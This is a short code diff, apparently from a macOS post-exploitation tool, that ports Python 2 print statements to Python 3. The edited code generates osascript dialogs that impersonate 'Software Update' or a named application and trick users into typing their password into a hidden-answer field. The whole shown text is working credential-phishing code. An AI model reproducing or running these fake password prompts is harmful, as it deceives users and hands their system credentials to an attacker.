@@ -96,8 +96,8 @@ choices = []
 for x in xrange(len(apps)):
     choices.append("[%s] %s " %(x+1, apps[x]) )
 
-print "\\nAvailable applications:\\n"
-print '\\n'.join(choices)
+print("\\nAvailable applications:\\n")
+print('\\n'.join(choices))
 """
 
         else:
@@ -105,14 +105,14 @@ print '\\n'.join(choices)
                 # osascript prompt for the current application with System Preferences icon
                 script = """
 import os
-print os.popen('osascript -e \\\'display dialog "Software Update requires that you type your password to apply changes." & return & return default answer "" with icon file "Applications:System Preferences.app:Contents:Resources:PrefApp.icns" with hidden answer with title "Software Update"\\\'').read()
+print(os.popen('osascript -e \\\'display dialog "Software Update requires that you type your password to apply changes." & return & return default answer "" with icon file "Applications:System Preferences.app:Contents:Resources:PrefApp.icns" with hidden answer with title "Software Update"\\\'').read())
 """
 
             else:
                 # osascript prompt for the specific application
                 script = """
 import os
-print os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read()
+print(os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read())
 """ % (appName, appName, appName, appName)
 
         return script
